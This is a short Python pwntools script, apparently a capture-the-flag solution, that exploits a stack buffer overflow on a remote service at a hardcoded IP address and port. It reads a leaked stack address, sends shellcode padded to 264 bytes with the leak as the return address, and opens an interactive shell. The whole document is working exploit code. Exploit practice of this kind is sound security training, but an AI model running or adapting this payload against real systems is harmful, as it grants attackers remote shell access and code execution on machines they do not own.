from pwn import *
context.arch='x86_64'
io = remote("143.198.227.172", 32777)

io.recvuntil(b"u: ")

leak = int(io.recvline().strip(), 16)

print("Leaked address:", hex(leak))

shellcode = asm(shellcraft.sh())

padding = b"A" * (264 - len(shellcode)) 

payload = shellcode + padding + p64(leak)

io.sendline(payload)

io.interactive()
 
